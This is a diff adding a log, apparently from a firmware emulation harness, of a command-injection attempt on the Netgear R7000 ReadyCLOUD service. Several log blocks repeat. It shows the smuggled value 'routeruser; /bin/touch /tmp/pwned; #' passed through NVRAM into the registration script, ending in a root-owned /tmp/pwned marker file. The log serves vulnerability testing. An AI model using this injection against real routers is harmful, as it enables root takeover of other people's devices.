@@ -1,0 +1,104 @@
+Netgear R7000 ReadyCLOUD leafp2p-to-comm RCE attempt
+Date: 2026-06-08T12:10:14Z
+
+[input]
+{"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}
+[stdout]
+Content-type:text/html
+
+[2026-06-08 12:10:13.574528] [0x00000400] [info]    starting /opt/leafp2p/leafp2p
+[2026-06-08 12:10:13.577204] [0x00000400] [info]    name /api/services/readycloud
+[2026-06-08 12:10:13.577656] [0x00000400] [info]    Put method to control services
+[2026-06-08 12:10:13.574528] [0x00000400] [info]    starting /opt/leafp2p/leafp2p
+[2026-06-08 12:10:13.578761] [0x00000400] [info]    string incoming is {"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}
+[2026-06-08 12:10:13.579353] [0x00000400] [info]    request is {"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}
+You need to specify whom to kill
+[2026-06-08 12:10:13.618568] [0x00000400] [info]    Using routeruser; /bin/touch /tmp/pwned; # as device username (length - 36
+[2026-06-08 12:10:13.619206] [0x00000400] [info]    Using routerpass as device password (length - 10
+[2026-06-08 12:10:13.619667] [0x00000400] [info]    Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
+[2026-06-08 12:10:14.257792] [0x00000400] [info]    users command output: 
+[2026-06-08 12:10:14.263917] [0x00000400] [info]    end of users.
+[2026-06-08 12:10:14.266718] [0x00000400] [info]    remote_user_conf -add -id 'alice@example.com' -email '----' -password '59292AE699E2108ADE2561AE551676EE'
+[2026-06-08 12:10:14.305597] [0x00000400] [info]    starting /opt/remote/run_remote
+[2026-06-08 12:10:14.306358] [0x00000400] [info]    starting /opt/rcagent/rcagentd
+[2026-06-08 12:10:13.618568] [0x00000400] [info]    Using routeruser; /bin/touch /tmp/pwned; # as device username (length - 36
+[2026-06-08 12:10:13.619206] [0x00000400] [info]    Using routerpass as device password (length - 10
+[2026-06-08 12:10:13.619667] [0x00000400] [info]    Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
+[2026-06-08 12:10:14.257792] [0x00000400] [info]    users command output: 
+[2026-06-08 12:10:14.263917] [0x00000400] [info]    end of users.
+[2026-06-08 12:10:14.266718] [0x00000400] [info]    remote_user_conf -add -id 'alice@example.com' -email '----' -password '59292AE699E2108ADE2561AE551676EE'
+[2026-06-08 12:10:14.305597] [0x00000400] [info]    starting /opt/remote/run_remote
+[2026-06-08 12:10:13.618568] [0x00000400] [info]    Using routeruser; /bin/touch /tmp/pwned; # as device username (length - 36
+[2026-06-08 12:10:13.619206] [0x00000400] [info]    Using routerpass as device password (length - 10
+[2026-06-08 12:10:13.619667] [0x00000400] [info]    Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
+[2026-06-08 12:10:14.257792] [0x00000400] [info]    users command output: 
+[2026-06-08 12:10:14.263917] [0x00000400] [info]    end of users.
+[2026-06-08 12:10:14.266718] [0x00000400] [info]    remote_user_conf -add -id 'alice@example.com' -email '----' -password '59292AE699E2108ADE2561AE551676EE'
+[2026-06-08 12:10:14.305597] [0x00000400] [info]    starting /opt/remote/run_remote
+[2026-06-08 12:10:14.306358] [0x00000400] [info]    starting /opt/rcagent/rcagentd
+[stderr]
+cat: can't open '/tmp/xagent_watchdog.pid': No such file or directory
+internet: can't resolve symbol 'acosNvramConfig_match'
+/var/run/remote_smb_conf.pid: No such file or directory
+Could not connect: Connection refused
+/var/run/remote_smb_conf.pid: No such file or directory
+Could not connect: Connection refused
+[nvram-store]
+readycloud_registration_owner=alice@example.com
+leafp2p_run=1
+x_force_connection=1
+[c-nvram-log]
+GET=rcagent_path
+GET=leafp2p_path
+GET=remote_path
+GET=rcagent_log_to_console
+GET=rcagent_log_to_udp
+GET=rcagent_log_to_file
+GET=leafp2p_username
+readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
+COMMIT=1
+GET=leafp2p_password
+readycloud_password=routerpass
+COMMIT=1
+GET=readycloud_control_path
+GET=leafp2p_username
+GET=leafp2p_password
+GET=leafp2p_run
+GET=leafp2p_debug
+GET=leafp2p_connection_mtu
+GET=leafp2p_firewall
+GET=leafp2p_rescan_devices
+GET=leafp2p_websvc_host
+GET=leafp2p_strict_connection
+GET=leafp2p_prefer_lan_connection
+GET=leafp2p_preferred_interface
+GET=leafp2p_connection_method_type
+GET=leafp2p_connection_try_mask
+GET=leafp2p_plain_service_connection
+GET=leafp2p_peer_route_type
+GET=leafp2p_scripts_folder_name
+GET=leafp2p_report_as_lan_connection
+GET=leafp2p_log_type
+GET=leafp2p_log_file_name
+GET=leafp2p_log_entry_limit
+GET=leafp2p_log_entry_flush
+GET=leafp2p_services
+GET=readycloud_registration_owner
+[wrapper-log]
+readycloud_nvram get readycloud_fetch_url
+readycloud_nvram get readycloud_hostname
+readycloud_nvram get readycloud_password
+readycloud_nvram get x_agent_id
+remote_smb_conf -get_model_name
+system get serial_number
+version 
+curl --basic -k --user routeruser
+readycloud_nvram set readycloud_registration_owner=alice@example.com
+readycloud_nvram set leafp2p_run=1
+readycloud_nvram set x_force_connection=1
+readycloud_nvram commit
+[curl-stdin]
+<?xml version="1.0" encoding="utf-8"?><request moniker="/root/devices" method="register"><body type="registration"><username>alice@example.com</username><password><![CDATA[plainpass]]></password><model>R7000</model><firmware_id>1.0.9.18</firmware_id><x_agent_id>xagent-local</x_agent_id><license><LicenseKey>sdfsfgjsflkj</LicenseKey><hardwareSN>SERIALLOCAL</hardwareSN><StartTime>0</StartTime><ExpiredTime>999</ExpiredTime><valid>true</valid></license></body></request>
+
+[pwned]
+-rw-r--r-- 1 root root 0 Jun  8 12:10 /tmp/netgear_readycloud_comm_rce_2026_06_08/rootfs/tmp/pwned
